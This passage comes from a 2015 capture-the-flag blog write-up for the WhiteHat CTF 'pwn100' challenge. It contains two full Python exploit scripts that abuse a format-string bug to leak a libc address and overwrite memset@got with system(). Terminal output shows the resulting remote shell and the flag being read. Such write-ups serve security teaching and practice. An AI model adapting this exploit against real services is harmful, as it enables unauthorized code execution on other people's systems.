</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 6666))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;lab33.wargame.whitehat.vn&#39;</span><span class="p">,</span> <span class="mi">10100</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># send invalid tag1</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">511</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x0a</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># tag2 is also invalid, but we will bypass the protection</span>
</span><span class='line'>  <span class="c"># leak write@got</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a01c</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;%6$s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>    <span class="c"># 0x804a01c = write@got</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># first, enable tag2 by overwriting Tag2::verified</span>
</span><span class='line'>  <span class="c"># it will be printed using sprintf() even though it contains invalid chars \o/</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;T2Verify 1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># receive crap from format string</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>   
</span><span class='line'>  <span class="c"># receive actual information, contains leaked got pointers</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> 
</span><span class='line'>  <span class="n">libc_write</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># remote</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked write    : &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_write</span><span class="p">)</span>
</span><span class='line'>  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_write</span> <span class="o">-</span> <span class="mh">0x000d9510</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc base addr  : &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
</span><span class='line'>  <span class="n">libc_rce</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x003fcd0</span> <span class="c"># system</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc system addr: &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_rce</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>python poc1.py
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked write    : 0xf7607510
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc base addr  : 0xf752e000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc system addr: <span class="nv">0xf756dcd0</span>
</span><span class='line'>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 0
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>Looks good, right? Now, the trick is to <em>invalidate</em> Tag2 again, so we can set it to a new format string, then revalidate it again. The new format string will take care of overwriting a GOT pointer with our acquired <code>system()</code> address.</p>

<p>I chose to overwrite <code>memset@got</code> with <code>system()</code>. One of the arguments to memset is the buffer which contains our input. By overwriting memset with system, the next time memset is called, we&rsquo;ll effectively run system(our_input)!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;localhost&#39;, 6666))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;lab33.wargame.whitehat.vn&#39;</span><span class="p">,</span> <span class="mi">10100</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># send invalid tag1</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">511</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x0a</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># tag2 is also invalid, but we will bypass the protection</span>
</span><span class='line'>  <span class="c"># leak write@got</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a01c</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;%6$s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>    <span class="c"># 0x804a01c = write@got</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># first, enable tag2 by overwriting Tag2::verified</span>
</span><span class='line'>  <span class="c"># it will be printed using sprintf() even though it contains invalid chars \o/</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;T2Verify 1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># receive crap from format string</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>   
</span><span class='line'>  <span class="c"># receive actual information, contains leaked got pointers</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> 
</span><span class='line'>  <span class="n">libc_write</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># remote</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked write    : &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_write</span><span class="p">)</span>
</span><span class='line'>  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_write</span> <span class="o">-</span> <span class="mh">0x000d9510</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc base addr  : &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
</span><span class='line'>  <span class="n">libc_rce</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x003fcd0</span> <span class="c"># system</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc system addr: &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_rce</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># invalidate t2 again by overflowing t1 into Tag::verified, so we can set it to a new value</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># calculate the magic constants for the string format attack</span>
</span><span class='line'>  <span class="c"># don&#39;t stare too long at them or you&#39;ll go blind</span>
</span><span class='line'>  <span class="n">magic1</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x100</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc_rce</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>  <span class="n">magic2</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x100</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc_rce</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc_rce</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>  <span class="n">magic3</span> <span class="o">=</span> <span class="p">((</span><span class="mh">0x100</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc_rce</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="p">((</span><span class="n">libc_rce</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># send new t2</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># ugly format string will write out address of system() into memset@got byte-by-byte</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a020</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a021</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804a022</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">magic1</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%6$hhn%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">magic2</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%7$hhn%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">magic3</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%8$hhn</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># 0x804a01c = write@got</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># validate t2 by sending an invalid t1</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># we now get another shot at sending a correct t1,</span>
</span><span class='line'>  <span class="c"># however, memset is overwritten with system(), so now it should spawn a shell</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;/bin/sh</span><span class="se">\x0a</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Enjoy your shell!&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s run it against the remote system:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>python poc1.py
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked write    : 0xf75c0510
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc base addr  : 0xf74e7000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc system addr: 0xf7526cd0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Enjoy your shell!
</span><span class='line'>T2Verify 1
</span><span class='line'>...snip...
</span><span class='line'>T1sh: 1: Syntax error: Unterminated quoted string
</span><span class='line'>Verify 0
</span><span class='line'>        sh: 1: Verify: not found
</span><span class='line'>/bin/sh
</span><span class='line'>...snip...
</span><span class='line'> Not verify , content?
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span><span class="m">1002</span> <span class="nv">gid</span><span class="o">=</span>1002
</span><span class='line'>cat /home/*/flag
</span><span class='line'>WhiteHat<span class="o">{</span>786fdd7b4ed544a186e6457a4c24fe8a95a67bbc<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>A lot of crap is printed, but in the end we land our shell!</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>

      




<time class='entry-date' datetime='2015-07-25T21:17:14+02:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:17 pm</span></time>
      


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/07/25/whitehat-ctf-pwn100/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/07/25/whitehat-ctf-pwn100/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/07/12/polictf-2015-johns-shuffle/" title="Previous Post: PoliCTF 2015 - John's Shuffle">&laquo; PoliCTF 2015 - John&#8217;s Shuffle</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/08/18/camp-ctf-shell/" title="Next Post: CAMP CTF - Shell">CAMP CTF - Shell &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/09/21/ekoparty-cry100/">Ekoparty - Cry100</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/21/ekoparty-pwn200/">Ekoparty - Pwn200</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/18/camp-ctf-dkm/">CAMP CTF - Dkm</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/18/camp-ctf-ropcalc/">CAMP CTF - Ropcalc</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/18/camp-ctf-secret-file/">CAMP CTF - Secret_File</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - barrebas -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'barrebas';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://barrebas.github.io/blog/2015/07/25/whitehat-ctf-pwn100/';
        var disqus_url = 'http://barrebas.github.io/blog/2015/07/25/whitehat-ctf-pwn100/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
